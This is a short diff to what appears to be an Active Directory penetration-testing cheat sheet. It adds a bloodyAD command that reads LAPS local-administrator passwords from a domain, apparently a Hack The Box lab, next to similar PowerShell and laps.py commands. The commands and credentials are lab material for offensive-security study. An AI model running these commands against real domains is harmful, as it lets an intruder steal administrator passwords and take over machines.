@@ -144,6 +144,8 @@ Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
 ```
 ```bash
 python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
+
+bloodyAD --host 10.129.9.179 -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 ```
 
 ### ReadGMSAPassword
